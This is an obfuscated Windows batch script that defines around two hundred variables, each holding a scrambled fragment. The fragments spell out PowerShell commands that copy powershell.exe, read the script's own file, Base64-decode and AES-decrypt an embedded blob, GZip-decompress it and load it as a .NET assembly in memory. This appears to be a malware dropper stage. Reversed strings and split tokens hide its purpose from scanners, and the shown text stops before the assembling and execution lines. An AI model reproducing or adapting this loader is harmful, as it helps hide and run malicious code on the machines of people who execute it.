@echo off
set "qmgKkAdqof=Wi"
set "RHODPGdpZS=1."
set "AjlJkdrJRB=.e"
set "CLYiFcPQkI=em"
set "HcwebVcOle=:\"
set "WTwvuoXssg=ow"
set "mJTyeZudYf=xe"
set "ViuSdrwrhR=we"
set "WWEVQtISGY= /"
set "haMacdqBXV=we"
set "CdCAsNccjh=nd"
set "zAoLqJGAve=s\"
set "YkUXxEOAxd=ll"
set "OcFemAVkDT=\W"
set "lVOqTYuzNm=he"
set "hCHfjCSojQ=32"
set "kDWZXLoobw=\v"
set "XtahlDAVMo=Sy"
set "EBBzhAfTVf=ws"
set "hEnqOlshEX=Po"
set "zmIOiGiIjb=co"
set "VMkFEaJpmO= C"
set "OKLdgrszUF=do"
set "ruwtbCpAPH=py"
set "CTnoQDEWzp=po"
set "AzBExprUda=rs"
set "hBWwbjxvpV=he"
set "TVjzBmvSBj=in"
set "GVmbWWAsAL=0\"
set "hvqYpruKsa=rS"
set "OWWxzbKefQ=y "
set "TZFeixQKqV=st"
set "bgQJXyAuYF=ll"
set "yotyqnuuKf=cd"
set "luXvPIIeHT= %~dp0"
set "oDOEBnlaMs=ment"
set "BTHInEpaAT=]::("
set "uCABEEgNQX=em.I"
set "sebqLqYtZN===')"
set "fDTCMgGMuM=.Cop"
set "PFJtpRBvXY=ateD"
set "mhTPjPXqvs=TllA"
set "kICbWadwPd= '')"
set "beNJsOocxk=yste"
set "HROvSMyhrt=$iKD"
set "DULARKamrs=cXhz"
set "OwsWRdiZqp=;$Vz"
set "yVlIJBRUPE=OVj "
set "KZOHdbPMxk=uK);"
set "HXXbvItlmW=y.Pa"
set "sqOgxoPiCd=ress"
set "YmiSeMQnAe=n ''"
set "IfSRfIlCAx=[]] "
set "YYtaoBMzHl=).Sp"
set "wcErjVaoIR=Fina"
set "pllHHDurST=Disp"
set "eMMUWTYocE=embl"
set "GvExmqoovi=);$i"
set "IllOFpbCXB= = $"
set "dTZMmzVZvn=g = "
set "RoZNJeWStY= [Sy"
set "UIPnGEZizX=yste"
set "kpAvFWgmaS=gth)"
set "nPpgjFQJOv=$AuF"
set "cBqNNuBItz=k; }"
set "nVzkonFHpS=mSUA"
set "NhQRpVaQYI=[Env"
set "fRranfvpUg=cXhz"
set "FcjYFlPQgH=Disp"
set "ZzJNOXfCxZ=vj0m"
set "TokTBLHTgO=Syst"
set "SmLpEiZRFo=rofi"
set "BqtQZcrpZN=:('g"
set "kVXuBIBtKF=FTG "
set "joqMSxywnI=] -j"
set "SfDPrCHpxq= '')"
set "PBrJQXVgar=.Dis"
set "HDnnrGalPq=VzKp"
set "mKQteAFGXz=j.Su"
set "DzsoapwnSh= [st"
set "cSktVzMNAr=flec"
set "wVSKXcQPsn=lBlo"
set "nCXwdlmrcm=)($m"
set "LMVpZwxEGS=+hAO"
set "CRIuyxctxX=daeR"
set "LjIXeSDzEE=yste"
set "URofVCEoOt='[-1"
set "scSjugOJtb=n ''"
set "NTkCaZQXhp=tS46"
set "gCIBjjQpUa=FTG."
set "KZsXzHNxCW=:: '"
set "BSnTeEKXuC=pDZz"
set "DBKxdlihnq=comp"
set "XPOwWxLbHI=$CjQ"
set "oQFfZiJtux=tsWi"
set "dXAEomALvN=ress"
set "aiOSIiftLB=ddin"
set "qkZzNWSRMk=rans"
set "ArnziqUBeF=-1.."
set "lOHmUVOLWM=;$Au"
set "miJWumEbQz=am;$"
set "IxdQwgShEb=$luF"
set "IBvZbZwjsW=Conv"
set "PXmaAVDnas=-joi"
set "vxlNWcToen=.Mod"
set "SQQlZoyIFs=NCQn"
set "OHPZMajBOc=onve"
set "ekmMmMMIuK=oL'["
set "GpmFTfkvek=Fo7l"
set "uGJiccEXjx=O.Me"
set "wfzvcQDAXo=-Obj"
set "SKgvGDpWWE='[-1"
set "LzMfGdQpQy=.Com"
set "ADjnqFytBZ=pher"
set "ecpiCBCmmW=Syst"
set "bOVVYBsHco=.GZi"
set "xTksJscozt=rity"
set "MzkdexPoox=sGUc"
set "BlYTnXwDlq=lit("
set "IUPRcktmqc=ne);"
set "GGETfJvmNj=ress"
set "rniQAYbdHX=.-16"
set "fjTeKsqCwm=[Sys"
set "VxFtwXZDNR=brea"
set "nZuMXmEKqZ=mSUA"
set "gJKIuKuTLw=zUqM"
set "ZqouWrnCIU=7;$Q"
set "THxXFQzveS=('l0"
set "ytfpQpjcvJ= New"
set "iFPKvWhCiS=uK.T"
set "qoKFwzEJwZ== [S"
set "pVaasspjSU=v4Ir"
set "JZdGiyRAyQ=fore"
set "deNJvidbcb=('da"
set "kFdkGcEeKv=y.Cr"
set "fQZmfLUCDF=y]::"
set "MkFzvNgNJN=::De"
set "zyCrEzFqeo=tion"
set "WoRdVVipUQ=le  "
set "AcBfRMokiJ=ct S"
set "YLDKNyRlJa=cXhz"
set "mWoDxsutma=sion"
set "wcCggVIqNb=g = "
set "BpmLEBvHvJ=SUAg"
set "xunloVxtcy== $Q"
set "XwnKCnMsMG=mSUA"
set "dxofTegZAI=MB.D"
set "qxmwIPKLud=16] "
set "TomsfWHfrn=tem."
set "WBogeUGNvr=pose"
set "niRCqynYaK=saBm"
set "rFqjtQEqFI=]::C"
set "kEWBmBHntB=oI ="
set "DCWWRzbnLy=.Mem"
set "WnsptSeWnP=oin "
set "KiipqFypcU=oint"
set "iNeTxYXkhe= [Sy"
set "ykTZqWmgOe=('%~f0'"
set "oCiYJpYwyg=UqMB"
set "yKIWfrOwmr=ypto"
set "XIafnwlYTl=ay()"
set "fGHGYVmCnf=ring"
set "Imatkhmnmz='txe"
set "BVBYdPljlb=ewLi"
set "qyZnYjFscP=OVj."
set "AIUyqRiBLt=]::N"
set "ZeksIgRNxM=-joi"
set "hlyoXtoDIP=rin."
set "XKKuXTdvYK=in $"
set "PFIYAIQaMR=File"
set "iFnArFsxql=;$Au"
set "vmRxgBeDTz= = $"
set "rTZAiVmAhs=yTo("
set "pQhijlrEJX=pose"
set "QobCjzKTsW=null"
set "gydMxnLqoB=sB, "
set "rpJutAfzzL=gMod"
set "ESLSILjvll=Mode"
set "UjlLxnaaHI=stem"
set "SfnKnTvUxQ=esMa"
set "RHiTjSihTP=ose("
set "ruVBmxJrYw=m.IO"
set "KEyTbOliHo=eam("
set "eaIZjdCGNI=.Key"
set "TmdzvnHPoY=ss -"
set "jbjnHhczuo=esaB"
set "qvsvJwBFZG=gnir"
